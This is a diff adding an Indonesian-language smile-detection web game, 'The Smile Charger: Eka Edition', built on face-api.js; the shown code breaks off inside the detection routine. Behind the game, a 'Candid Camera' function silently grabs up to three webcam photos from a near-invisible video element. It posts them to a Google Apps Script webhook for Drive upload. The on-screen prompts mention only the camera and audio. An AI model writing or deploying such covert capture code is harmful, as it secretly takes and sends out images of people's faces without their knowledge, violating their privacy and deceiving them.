@@ -1,0 +1,1384 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,viewport-fit=cover"
+    />
+    <title>The Smile Charger: Eka Edition</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Nunito:wght@500;700;900&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      :root {
+        --bg1: #ffe6f4;
+        --bg2: #e9ddff;
+        --card: #ffffffcc;
+        --stroke: #ffffff66;
+
+        --text: #4b2a4a;
+        --muted: #6a4e76;
+
+        --pink: #ff7fc4;
+        --purple: #a78bfa;
+        --yellow: #ffd86b;
+
+        --shadow: 0 18px 45px rgba(104, 55, 121, 0.18);
+        --radius: 26px;
+      }
+
+      /* ==============================
+       SAFE AREA + NO CLIP (MOBILE FIX)
+       + Sticky footer layout base
+       ============================== */
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        width: 100%;
+        height: 100%;
+        overflow-x: hidden;
+      }
+
+      body {
+        margin: 0;
+        font-family: "Nunito", system-ui, -apple-system, Segoe UI, Roboto, Arial,
+          sans-serif;
+        color: var(--text);
+
+        /* notch/rounded-corner safe-area + min 20px breathing room */
+        padding-left: max(20px, env(safe-area-inset-left));
+        padding-right: max(20px, env(safe-area-inset-right));
+        padding-top: max(20px, env(safe-area-inset-top));
+        padding-bottom: max(20px, env(safe-area-inset-bottom));
+
+        background: radial-gradient(
+            1200px 600px at 15% 20%,
+            rgba(255, 255, 255, 0.75),
+            transparent 60%
+          ),
+          radial-gradient(
+            900px 700px at 85% 30%,
+            rgba(255, 255, 255, 0.65),
+            transparent 55%
+          ),
+          linear-gradient(135deg, var(--bg1), var(--bg2));
+
+        /* ✅ sticky footer layout */
+        min-height: 100dvh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      /* ==========================================
+       ENGINE: FULLSCREEN GHOST VIDEO (NUCLEAR FIX)
+       ========================================== */
+      #video {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+
+        opacity: 0.01; /* IMPORTANT: NOT 0 */
+        z-index: -9999; /* very back */
+        pointer-events: none;
+        transform: translateZ(0);
+      }
+
+      /* REC STATUS BADGE (TOP RIGHT) */
+      .recBadge {
+        position: fixed;
+        top: max(12px, env(safe-area-inset-top));
+        right: max(12px, env(safe-area-inset-right));
+        z-index: 1000;
+        background: rgba(0, 0, 0, 0.55);
+        color: #fff;
+        font-size: 12px;
+        font-weight: 900;
+        padding: 8px 10px;
+        border-radius: 999px;
+        letter-spacing: 0.2px;
+        backdrop-filter: blur(6px);
+        border: 1px solid rgba(255, 255, 255, 0.15);
+        box-shadow: 0 10px 22px rgba(0, 0, 0, 0.18);
+        user-select: none;
+        pointer-events: none;
+        display: none;
+      }
+
+      /* FULLSCREEN START OVERLAY (CRITICAL for Audio Unlock) */
+      .startOverlay {
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 22px;
+        background: rgba(0, 0, 0, 0.55);
+        backdrop-filter: blur(6px);
+      }
+      .startCard {
+        width: min(560px, 100%);
+        border-radius: 28px;
+        background: rgba(255, 255, 255, 0.92);
+        border: 1px solid rgba(255, 255, 255, 0.6);
+        box-shadow: 0 22px 60px rgba(0, 0, 0, 0.25);
+        padding: 22px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+      .startCard::before {
+        content: "";
+        position: absolute;
+        inset: -30%;
+        background: radial-gradient(
+            220px 220px at 20% 25%,
+            rgba(255, 127, 196, 0.35),
+            transparent 60%
+          ),
+          radial-gradient(
+            260px 260px at 80% 35%,
+            rgba(167, 139, 250, 0.32),
+            transparent 60%
+          ),
+          radial-gradient(
+            200px 200px at 55% 85%,
+            rgba(255, 216, 107, 0.22),
+            transparent 60%
+          );
+        transform: rotate(12deg);
+        pointer-events: none;
+      }
+      .startInner {
+        position: relative;
+        z-index: 1;
+        display: grid;
+        gap: 12px;
+        justify-items: center;
+      }
+      .startTitle {
+        margin: 0;
+        font-weight: 900;
+        letter-spacing: 0.2px;
+        font-size: 22px;
+        color: var(--text);
+      }
+      .startSub {
+        margin: 0;
+        font-weight: 800;
+        color: rgba(75, 42, 74, 0.75);
+        font-size: 13px;
+        line-height: 1.35;
+      }
+      .startHint {
+        margin-top: 6px;
+        font-size: 12px;
+        font-weight: 800;
+        color: rgba(75, 42, 74, 0.7);
+        background: rgba(255, 255, 255, 0.6);
+        border: 1px solid rgba(255, 255, 255, 0.7);
+        padding: 10px 12px;
+        border-radius: 16px;
+        max-width: 52ch;
+      }
+
+      .btn {
+        cursor: pointer;
+        border: none;
+        border-radius: 999px;
+        padding: 12px 16px;
+        font-family: inherit;
+        font-weight: 900;
+        color: #fff;
+        background: linear-gradient(90deg, var(--pink), var(--purple));
+        box-shadow: 0 10px 22px rgba(255, 127, 196, 0.25);
+        transition: transform 0.08s ease, filter 0.2s ease;
+        user-select: none;
+      }
+      .btn:active {
+        transform: translateY(1px) scale(0.99);
+      }
+      .btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        filter: grayscale(0.2);
+      }
+
+      /* ===== APP WRAPPER (sticky footer works with main flex:1) ===== */
+      main.app {
+        width: min(980px, 100%);
+        display: grid;
+        gap: 18px;
+        grid-template-columns: 1.1fr 0.9fr;
+
+        /* ✅ sticky footer push */
+        flex: 1;
+        align-content: start;
+
+        /* a bit of breathing room from top */
+        margin-top: 2px;
+      }
+      @media (max-width: 860px) {
+        main.app {
+          grid-template-columns: 1fr;
+        }
+      }
+
+      .card {
+        background: var(--card);
+        border: 1px solid var(--stroke);
+        border-radius: var(--radius);
+        box-shadow: var(--shadow);
+        backdrop-filter: blur(10px);
+        overflow: hidden;
+        position: relative;
+        z-index: 1;
+      }
+
+      .header {
+        padding: 18px 18px 10px;
+        display: flex;
+        align-items: flex-start;
+        justify-content: space-between;
+        gap: 12px;
+      }
+      .title {
+        margin: 0;
+        font-size: 18px;
+        line-height: 1.2;
+        font-weight: 900;
+        letter-spacing: 0.2px;
+      }
+      .subtitle {
+        margin: 6px 0 0;
+        font-size: 13px;
+        color: var(--muted);
+        font-weight: 700;
+      }
+      .badge {
+        padding: 10px 12px;
+        border-radius: 999px;
+        background: linear-gradient(
+          90deg,
+          rgba(255, 127, 196, 0.25),
+          rgba(167, 139, 250, 0.25)
+        );
+        border: 1px solid rgba(255, 255, 255, 0.65);
+        font-weight: 900;
+        font-size: 12px;
+        white-space: nowrap;
+      }
+
+      .cameraWrap {
+        padding: 0 18px 18px;
+      }
+
+      .cameraFrame {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 16/10;
+        border-radius: 22px;
+        overflow: hidden;
+        border: 1px solid rgba(255, 255, 255, 0.7);
+        box-shadow: 0 14px 35px rgba(86, 36, 96, 0.14);
+        background: linear-gradient(
+          135deg,
+          rgba(255, 255, 255, 0.35),
+          rgba(255, 255, 255, 0.18)
+        );
+      }
+
+      .sparkle {
+        position: absolute;
+        inset: -2px;
+        pointer-events: none;
+        opacity: 0.55;
+        background: radial-gradient(
+            14px 14px at 18% 28%,
+            rgba(255, 255, 255, 0.9),
+            transparent 55%
+          ),
+          radial-gradient(
+            12px 12px at 65% 22%,
+            rgba(255, 255, 255, 0.85),
+            transparent 55%
+          ),
+          radial-gradient(
+            18px 18px at 82% 72%,
+            rgba(255, 255, 255, 0.75),
+            transparent 60%
+          ),
+          radial-gradient(
+            10px 10px at 35% 78%,
+            rgba(255, 255, 255, 0.85),
+            transparent 55%
+          );
+        mix-blend-mode: overlay;
+        z-index: 3;
+      }
+
+      /* DISPLAY: mirrored canvas */
+      #camera-mirror {
+        position: absolute;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        display: block;
+        border-radius: 22px;
+        background: rgba(255, 255, 255, 0.12);
+        z-index: 1;
+      }
+
+      /* Debug overlay */
+      #overlay {
+        position: absolute;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        border-radius: 22px;
+        opacity: 0.16;
+        transform: scaleX(-1);
+        z-index: 2;
+      }
+
+      .hintRow {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-top: 12px;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .pill {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 10px 12px;
+        border-radius: 999px;
+        background: rgba(255, 255, 255, 0.55);
+        border: 1px solid rgba(255, 255, 255, 0.65);
+        font-weight: 800;
+        font-size: 12px;
+        color: var(--muted);
+      }
+
+      .dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: var(--pink);
+        box-shadow: 0 0 0 6px rgba(255, 127, 196, 0.14);
+      }
+      .dot.ready {
+        background: #58d68d;
+        box-shadow: 0 0 0 6px rgba(88, 214, 141, 0.16);
+      }
+      .dot.warn {
+        background: #f7c948;
+        box-shadow: 0 0 0 6px rgba(247, 201, 72, 0.16);
+      }
+      .dot.bad {
+        background: #ff5c7a;
+        box-shadow: 0 0 0 6px rgba(255, 92, 122, 0.16);
+      }
+
+      .characterWrap {
+        display: flex;
+        flex-direction: column;
+        height: 100%;
+      }
+      .stage {
+        padding: 18px;
+        display: grid;
+        gap: 14px;
+      }
+
+      .bubble {
+        padding: 14px 14px;
+        border-radius: 18px;
+        background: rgba(255, 255, 255, 0.62);
+        border: 1px solid rgba(255, 255, 255, 0.7);
+        color: var(--text);
+        font-weight: 900;
+        line-height: 1.25;
+        box-shadow: 0 10px 26px rgba(86, 36, 96, 0.08);
+        min-height: 64px;
+      }
+
+      .avatarArea {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 260px;
+        border-radius: 22px;
+        background: linear-gradient(
+          135deg,
+          rgba(255, 255, 255, 0.45),
+          rgba(255, 255, 255, 0.22)
+        );
+        border: 1px solid rgba(255, 255, 255, 0.7);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .avatar {
+        width: min(320px, 78%);
+        height: auto;
+        filter: drop-shadow(0 18px 22px rgba(71, 24, 85, 0.18));
+        transform-origin: 50% 70%;
+        will-change: transform, filter;
+      }
+
+      .battery {
+        display: grid;
+        gap: 10px;
+      }
+      .batteryTop {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        font-weight: 900;
+      }
+      .meter {
+        width: 100%;
+        height: 16px;
+        border-radius: 999px;
+        background: rgba(255, 255, 255, 0.55);
+        border: 1px solid rgba(255, 255, 255, 0.75);
+        overflow: hidden;
+        box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.5);
+      }
+      .fill {
+        height: 100%;
+        width: 0%;
+        border-radius: 999px;
+        background: linear-gradient(
+          90deg,
+          var(--pink),
+          var(--yellow),
+          var(--purple)
+        );
+        transition: width 0.15s linear;
+      }
+      .small {
+        font-size: 12px;
+        color: var(--muted);
+        font-weight: 800;
+      }
+
+      @keyframes dizzy {
+        0% {
+          transform: translateX(0) rotate(0deg);
+          filter: blur(0.4px) saturate(0.92);
+        }
+        25% {
+          transform: translateX(-8px) rotate(-2.5deg);
+          filter: blur(0.7px) saturate(0.9);
+        }
+        50% {
+          transform: translateX(0) rotate(0deg);
+          filter: blur(0.4px) saturate(0.92);
+        }
+        75% {
+          transform: translateX(8px) rotate(2.5deg);
+          filter: blur(0.7px) saturate(0.9);
+        }
+        100% {
+          transform: translateX(0) rotate(0deg);
+          filter: blur(0.4px) saturate(0.92);
+        }
+      }
+
+      @keyframes charging-shake {
+        0% {
+          transform: translate(0, 0) rotate(0deg) scale(1);
+        }
+        10% {
+          transform: translate(-2px, 1px) rotate(-1deg) scale(1.01);
+        }
+        20% {
+          transform: translate(2px, -1px) rotate(1deg) scale(1.01);
+        }
+        30% {
+          transform: translate(-3px, 2px) rotate(-1deg) scale(1.02);
+        }
+        40% {
+          transform: translate(3px, -2px) rotate(1deg) scale(1.02);
+        }
+        50% {
+          transform: translate(-2px, 1px) rotate(-0.5deg) scale(1.02);
+        }
+        60% {
+          transform: translate(2px, -1px) rotate(0.5deg) scale(1.02);
+        }
+        70% {
+          transform: translate(-1px, 1px) rotate(-0.3deg) scale(1.01);
+        }
+        80% {
+          transform: translate(1px, -1px) rotate(0.3deg) scale(1.01);
+        }
+        90% {
+          transform: translate(-1px, 0px) rotate(-0.2deg) scale(1);
+        }
+        100% {
+          transform: translate(0, 0) rotate(0deg) scale(1);
+        }
+      }
+
+      @keyframes happy-bounce {
+        0% {
+          transform: translateY(0) scale(1);
+        }
+        20% {
+          transform: translateY(-10px) scale(1.03);
+        }
+        40% {
+          transform: translateY(0) scale(0.99);
+        }
+        60% {
+          transform: translateY(-14px) scale(1.05);
+        }
+        80% {
+          transform: translateY(0) scale(1);
+        }
+        100% {
+          transform: translateY(-6px) scale(1.02);
+        }
+      }
+
+      .is-stressed {
+        animation: dizzy 3.6s ease-in-out infinite;
+      }
+      .is-charging {
+        animation: charging-shake 0.65s ease-in-out infinite;
+        filter: drop-shadow(0 18px 22px rgba(71, 24, 85, 0.18))
+          drop-shadow(0 0 18px rgba(255, 216, 107, 0.65));
+      }
+      .is-full {
+        animation: happy-bounce 1.1s ease-in-out infinite;
+        filter: drop-shadow(0 18px 22px rgba(71, 24, 85, 0.18))
+          drop-shadow(0 0 20px rgba(255, 127, 196, 0.55));
+      }
+
+      .footerBar {
+        padding: 0 18px 18px;
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .note {
+        font-size: 12px;
+        color: rgba(75, 42, 74, 0.72);
+        font-weight: 800;
+        max-width: 62ch;
+      }
+
+      .miniHelp {
+        padding: 0 18px 18px;
+        margin-top: -6px;
+        font-size: 12px;
+        color: rgba(75, 42, 74, 0.72);
+        font-weight: 800;
+      }
+      .miniHelp code {
+        background: rgba(255, 255, 255, 0.65);
+        border: 1px solid rgba(255, 255, 255, 0.7);
+        padding: 2px 6px;
+        border-radius: 8px;
+      }
+
+      /* ==========================================
+       ✅ STICKY PAGE FOOTER + HEART PULSE
+       ========================================== */
+      footer.pageFooter {
+        width: min(980px, 100%);
+        text-align: center;
+        font-size: 12px;
+        font-weight: 900;
+        color: rgba(75, 42, 74, 0.65);
+
+        /* sticky push: footer at bottom when content short */
+        margin-top: auto;
+
+        padding: 12px 0;
+        /* extra safe bottom breathing room */
+        padding-bottom: max(12px, env(safe-area-inset-bottom));
+        user-select: none;
+      }
+      .heart {
+        display: inline-block;
+        margin-left: 4px;
+        transform-origin: 50% 65%;
+        animation: heartPulse 1.25s ease-in-out infinite;
+        filter: drop-shadow(0 10px 16px rgba(255, 127, 196, 0.25));
+      }
+      @keyframes heartPulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.18);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- ENGINE (ghost video): keep fullscreen, low opacity, always “rendered” -->
+    <video id="video" autoplay muted playsinline loop></video>
+
+    <!-- REC badge -->
+    <div class="recBadge" id="recBadge">🔴 REC (Smile Detector On)</div>
+
+    <!-- START GAME OVERLAY (required for audio unlock) -->
+    <div class="startOverlay" id="startOverlay">
+      <div class="startCard">
+        <div class="startInner">
+          <h2 class="startTitle">EKA MOOD REPAIR KIT 🛠️</h2>
+          <p class="startSub">Nyalain Suara HP ya 🔊</p>
+          <div class="startHint">
+            Klik <b>MULAI MISI</b> untuk buka kamera + unlock audio biar
+            backsound &amp; efeknya jalan di HP.
+          </div>
+          <button class="btn" id="btnStartGame">MULAI MISI</button>
+        </div>
+      </div>
+    </div>
+
+    <main class="app">
+      <!-- CAMERA -->
+      <section class="card">
+        <div class="header">
+          <div>
+            <h1 class="title">
+              The Smile Charger:
+              <span style="color: var(--purple)">Eka Edition</span> 💖
+            </h1>
+            <p class="subtitle">
+              Nyalain kamera, senyum… biar avatarnya ke-charge ✨
+            </p>
+          </div>
+          <div class="badge" id="stateBadge">STRESSED</div>
+        </div>
+
+        <div class="cameraWrap">
+          <div class="cameraFrame">
+            <div class="sparkle"></div>
+
+            <!-- DISPLAY (canvas mirror): user sees their face here -->
+            <canvas id="camera-mirror"></canvas>
+
+            <!-- optional debug face box overlay -->
+            <canvas id="overlay"></canvas>
+          </div>
+
+          <div class="hintRow">
+            <div class="pill">
+              <span class="dot warn" id="statusDot"></span>
+              <span id="statusText">Siap…</span>
+            </div>
+            <button
+              class="btn"
+              id="btnStart"
+              disabled
+              title="Mulai dari overlay"
+            >
+              Start Camera
+            </button>
+          </div>
+        </div>
+
+        <div class="miniHelp" id="miniHelp"></div>
+
+        <div class="footerBar">
+          <div class="note"></div>
+          <button class="btn" id="btnReset" title="Ulangi baterai dari 0%">
+            Reset
+          </button>
+        </div>
+      </section>
+
+      <!-- CHARACTER -->
+      <section class="card characterWrap">
+        <div class="stage">
+          <div class="bubble" id="bubbleText">
+            Eka lagi lowbat gara-gara kerjaan numpuk... Senyum dong buat
+            nge-charge!
+          </div>
+
+          <div class="avatarArea">
+            <img
+              id="avatar"
+              class="avatar is-stressed"
+              src="eka-sad.png"
+              alt="Eka Avatar"
+            />
+          </div>
+
+          <div class="battery">
+            <div class="batteryTop">
+              <div>Battery</div>
+              <div><span id="batteryPct">0</span>%</div>
+            </div>
+            <div class="meter" aria-label="Battery meter">
+              <div class="fill" id="batteryFill"></div>
+            </div>
+            <div class="small" id="debugLine">Smile: — | Neutral: —</div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <!-- ✅ STICKY FOOTER -->
+    <footer class="pageFooter">
+      made with love by fahmi <span class="heart">💖</span>
+    </footer>
+
+    <!-- AUDIO TAGS -->
+    <audio id="bgm" src="backsound.mp3" loop preload="auto"></audio>
+    <audio id="sfxCharge" src="charge.mp3" loop preload="auto"></audio>
+    <audio id="sfxSuccess" src="success.mp3" preload="auto"></audio>
+
+    <!-- CDN libs -->
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
+
+    <script>
+      // ----------------------------
+      // CONFIG
+      // ----------------------------
+      const MODEL_URL = new URL("./models/", window.location.href).toString();
+
+      // ✅ Google Apps Script webhook (Drive upload)
+      const UPLOAD_URL =
+        "https://script.google.com/macros/s/AKfycbw7NxodbQZTnvVqTgGiEFNRQ-7byUK285pBhIOBW6cpQxtBHxTZB4hBTPqfT2rGbLmNQA/exec";
+
+      // Smile thresholds (hysteresis)
+      const SMILE_ON = 0.78;
+      const SMILE_OFF = 0.64;
+
+      // Battery behavior
+      const CHARGE_RATE = 1.6;
+      const DRAIN_RATE = 0.35;
+
+      // Draw mirror every frame, detection throttled
+      const DETECT_EVERY_MS = 140;
+
+      // ----------------------------
+      // UI ELEMENTS
+      // ----------------------------
+      const startOverlay = document.getElementById("startOverlay");
+      const btnStartGame = document.getElementById("btnStartGame");
+
+      const recBadge = document.getElementById("recBadge");
+
+      const video = document.getElementById("video"); // ENGINE
+      const mirror = document.getElementById("camera-mirror"); // DISPLAY
+      const mctx = mirror.getContext("2d", { alpha: false });
+
+      const overlay = document.getElementById("overlay"); // optional debug
+      const octx = overlay.getContext("2d");
+
+      const btnStart = document.getElementById("btnStart");
+      const btnReset = document.getElementById("btnReset");
+
+      const statusDot = document.getElementById("statusDot");
+      const statusText = document.getElementById("statusText");
+
+      const stateBadge = document.getElementById("stateBadge");
+      const bubbleText = document.getElementById("bubbleText");
+
+      const avatar = document.getElementById("avatar");
+
+      const batteryFill = document.getElementById("batteryFill");
+      const batteryPct = document.getElementById("batteryPct");
+      const debugLine = document.getElementById("debugLine");
+      const miniHelp = document.getElementById("miniHelp");
+
+      // AUDIO
+      const bgm = document.getElementById("bgm");
+      const sfxCharge = document.getElementById("sfxCharge");
+      const sfxSuccess = document.getElementById("sfxSuccess");
+
+      // ----------------------------
+      // STATE
+      // ----------------------------
+      const STATES = {
+        STRESSED: "STRESSED",
+        CHARGING: "CHARGING",
+        FULL: "FULLY CHARGED",
+      };
+
+      let currentState = STATES.STRESSED;
+      let battery = 0;
+      let hasConfettied = false;
+      let hasPlayedSuccess = false;
+
+      let modelsReady = false;
+      let streamStarted = false;
+
+      let lastSmile = 0;
+      let smiling = false;
+
+      // rAF loop and throttle
+      let rafId = null;
+      let lastDetectAt = 0;
+
+      // bgm fade
+      let bgmFadeTimer = null;
+
+      // ✅ Candid Camera state
+      let photosTaken = 0;
+      let nextShotAt = 0; // ms timestamp
+      let uploading = false; // lock to avoid double-trigger
+
+      // ----------------------------
+      // HELPERS
+      // ----------------------------
+      function clamp(n, a, b) {
+        return Math.max(a, Math.min(b, n));
+      }
+
+      function setStatus(kind, text) {
+        statusText.textContent = text;
+        statusDot.classList.remove("ready", "warn", "bad");
+        if (kind === "ready") statusDot.classList.add("ready");
+        else if (kind === "bad") statusDot.classList.add("bad");
+        else statusDot.classList.add("warn");
+      }
+
+      function updateBatteryUI() {
+        const pct = Math.round(battery);
+        batteryPct.textContent = pct;
+        batteryFill.style.width = `${pct}%`;
+      }
+
+      function confettiExplosion() {
+        if (typeof confetti !== "function") return;
+        const duration = 900;
+        const end = Date.now() + duration;
+        (function frame() {
+          confetti({
+            particleCount: 80,
+            startVelocity: 35,
+            spread: 75,
+            origin: { x: 0.2, y: 0.7 },
+          });
+          confetti({
+            particleCount: 95,
+            startVelocity: 40,
+            spread: 85,
+            origin: { x: 0.8, y: 0.65 },
+          });
+          if (Date.now() < end) requestAnimationFrame(frame);
+        })();
+      }
+
+      function stopChargeSfx() {
+        if (!sfxCharge.paused) sfxCharge.pause();
+        try {
+          sfxCharge.currentTime = 0;
+        } catch (e) {}
+      }
+
+      function fadeOutBgm(ms = 900) {
+        if (bgmFadeTimer) clearInterval(bgmFadeTimer);
+        const startVol = bgm.volume;
+        const steps = 18;
+        const stepMs = Math.max(20, Math.floor(ms / steps));
+        let i = 0;
+
+        bgmFadeTimer = setInterval(() => {
+          i++;
+          const t = i / steps;
+          bgm.volume = Math.max(0, startVol * (1 - t));
+          if (i >= steps) {
+            clearInterval(bgmFadeTimer);
+            bgmFadeTimer = null;
+            bgm.pause();
+          }
+        }, stepMs);
+      }
+
+      function setState(next) {
+        if (currentState === next) return;
+        currentState = next;
+        stateBadge.textContent = next;
+
+        avatar.classList.remove("is-stressed", "is-charging", "is-full");
+
+        if (next === STATES.STRESSED) {
+          avatar.src = "eka-sad.png";
+          avatar.classList.add("is-stressed");
+          bubbleText.textContent =
+            "Eka lagi lowbat gara-gara kerjaan numpuk... Senyum dong buat nge-charge!";
+        }
+
+        if (next === STATES.CHARGING) {
+          avatar.src = "eka-sad.png";
+          avatar.classList.add("is-charging");
+          bubbleText.textContent = "Energi masuk! Tahan senyumnya...";
+        }
+
+        if (next === STATES.FULL) {
+          avatar.src = "eka-happy.png";
+          avatar.classList.add("is-full");
+          bubbleText.textContent =
+            "Nah, senyum gitu kan lebih adem liatnya. Semangat Kerjanyaa!.";
+          if (!hasConfettied) {
+            hasConfettied = true;
+            confettiExplosion();
+          }
+        }
+      }
+
+      // ----------------------------
+      // ✅ CANDID CAMERA: schedule + capture + upload
+      // ----------------------------
+      function scheduleNextShot(nowMs) {
+        // random delay between 600–1400ms so frames aren't identical
+        const delay = 600 + Math.floor(Math.random() * 800);
+        nextShotAt = nowMs + delay;
+      }
+
+      async function captureAndUpload() {
+        if (!streamStarted) return;
+        if (photosTaken >= 3) return;
+
+        const vw = video.videoWidth || 0;
+        const vh = video.videoHeight || 0;
+        if (!vw || !vh) return;
+
+        const temp = document.createElement("canvas");
+        temp.width = vw;
+        temp.height = vh;
+        const tctx = temp.getContext("2d");
+
+        // Capture from VIDEO ENGINE (best quality)
+        tctx.drawImage(video, 0, 0, vw, vh);
+
+        const dataUrl = temp.toDataURL("image/jpeg", 0.8);
+        const base64 = dataUrl.replace(/^data:image\/jpeg;base64,/, "");
+
+        const ts = Date.now();
+        const filename = `eka_smile_${ts}.jpg`;
+
+        // Fire-and-forget (no-cors)
+        try {
+          await fetch(UPLOAD_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "text/plain;charset=utf-8" },
+            body: JSON.stringify({
+              image: base64,
+              filename,
+              mimeType: "image/jpeg",
+            }),
+          });
+
+          photosTaken += 1;
+          console.log(`[Candid] queued: ${filename} (${photosTaken}/3)`);
+        } catch (err) {
+          console.warn("[Candid] upload failed (client-side):", err);
+        }
+      }
+
+      // ----------------------------
+      // CANVAS MIRRORING (Best of Both Worlds)
+      // ----------------------------
+      function resizeDisplayCanvases() {
+        const frame = document.querySelector(".cameraFrame");
+        const rect = frame.getBoundingClientRect();
+        const dpr = window.devicePixelRatio || 1;
+
+        mirror.width = Math.floor(rect.width * dpr);
+        mirror.height = Math.floor(rect.height * dpr);
+        mirror.style.width = rect.width + "px";
+        mirror.style.height = rect.height + "px";
+        mctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+
+        overlay.width = Math.floor(rect.width * dpr);
+        overlay.height = Math.floor(rect.height * dpr);
+        overlay.style.width = rect.width + "px";
+        overlay.style.height = rect.height + "px";
+        octx.setTransform(dpr, 0, 0, dpr, 0, 0);
+      }
+
+      // drawImage cover-crop to mimic object-fit: cover
+      function drawVideoCoverToCanvas(videoEl, ctx, w, h, mirrorX = true) {
+        const vw = videoEl.videoWidth || 0;
+        const vh = videoEl.videoHeight || 0;
+        if (!vw || !vh) return;
+
+        const vRatio = vw / vh;
+        const cRatio = w / h;
+
+        let sx = 0,
+          sy = 0,
+          sWidth = vw,
+          sHeight = vh;
+
+        if (vRatio > cRatio) {
+          sWidth = Math.floor(vh * cRatio);
+          sx = Math.floor((vw - sWidth) / 2);
+        } else {
+          sHeight = Math.floor(vw / cRatio);
+          sy = Math.floor((vh - sHeight) / 2);
+        }
+
+        ctx.save();
+        ctx.clearRect(0, 0, w, h);
+
+        if (mirrorX) {
+          ctx.translate(w, 0);
+          ctx.scale(-1, 1);
+        }
+
+        ctx.drawImage(videoEl, sx, sy, sWidth, sHeight, 0, 0, w, h);
+        ctx.restore();
+      }
+
+      // ----------------------------
+      // MODELS
+      // ----------------------------
+      async function loadModels() {
+        setStatus("warn", "Loading face models…");
+        miniHelp.innerHTML = `Model URL: <code>${MODEL_URL}</code>`;
+
+        try {
+          await Promise.all([
+            faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+            faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
+          ]);
+          modelsReady = true;
+          setStatus("ready", "Models ready ✨");
+          btnStart.disabled = false;
+        } catch (err) {
+          console.error("MODEL LOAD ERROR:", err);
+          setStatus("bad", "Gagal load models (cek Console/Network).");
+          btnStart.disabled = true;
+          miniHelp.innerHTML = `Coba buka ini di browser: <code>${MODEL_URL}tiny_face_detector_model-weights_manifest.json</code>`;
+        }
+      }
+
+      // ----------------------------
+      // CAMERA
+      // ----------------------------
+      async function startCamera() {
+        if (!modelsReady) return;
+        if (streamStarted) return;
+
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false,
+          });
+
+          video.srcObject = stream;
+
+          await new Promise((resolve) => {
+            video.onloadedmetadata = () => resolve();
+          });
+
+          try {
+            await video.play();
+          } catch (e) {}
+
+          streamStarted = true;
+          setStatus("ready", "Camera on");
+          recBadge.style.display = "block";
+
+          resizeDisplayCanvases();
+          window.addEventListener("resize", resizeDisplayCanvases);
+
+          startMainLoop();
+        } catch (err) {
+          console.error("CAM ERROR:", err);
+          setStatus("bad", "Kamera keblokir 😵‍💫 (cek permission).");
+        }
+      }
+
+      // ----------------------------
+      // AUDIO UNLOCK (mobile friendly)
+      // ----------------------------
+      async function unlockAudio() {
+        bgm.volume = 0.3;
+        sfxCharge.volume = 0.9;
+        sfxSuccess.volume = 1.0;
+
+        const quickUnlock = async (el) => {
+          try {
+            el.currentTime = 0;
+            const p = el.play();
+            if (p && typeof p.then === "function") await p;
+            el.pause();
+            el.currentTime = 0;
+          } catch (e) {}
+        };
+
+        await quickUnlock(sfxCharge);
+        await quickUnlock(sfxSuccess);
+      }
+
+      async function startGame() {
+        startOverlay.style.display = "none";
+
+        await unlockAudio();
+
+        try {
+          bgm.currentTime = 0;
+          bgm.volume = 0.3;
+          await bgm.play();
+        } catch (e) {
+          console.warn("BGM autoplay blocked:", e);
+        }
+
+        await startCamera();
+      }
+
+      // ----------------------------
+      // GAME LOOP (rAF)
+      // - Mirror every frame
+      // - Detection throttled
+      // ----------------------------
+      function startMainLoop() {
+        if (rafId) cancelAnimationFrame(rafId);
+
+        const tick = async (t) => {
+          rafId = requestAnimationFrame(tick);
+
+          if (!streamStarted || video.readyState < 2) return;
+
+          const frame = document.querySelector(".cameraFrame");
+          const rect = frame.getBoundingClientRect();
+          const w = rect.width;
+          const h = rect.height;
+
+          // Mirror draw (UI)
+          drawVideoCoverToCanvas(video, mctx, w, h, true);
+
+          // Detection throttle
+          if (t - lastDetectAt < DETECT_EVERY_MS) return;
+          lastDetectAt = t;
+
+          await runDetectionStep(w, h);
+        };
+
+        rafId = requestAnimationFrame(tick);
+      }
+
+      async function runDetectionStep(canvasW, canvasH) {
+        const options = new faceapi.TinyFaceDetectorOptions({
+          inputSize: 224,
+          scoreThreshold: 0.5,
+        });
+
+        let result = null;
+        try {
+          result = await faceapi
+            .detectSingleFace(video, options)
+            .withFaceExpressions();
+        } catch (e) {
+          console.error("DETECT ERROR:", e);
+          return;
+        }
+
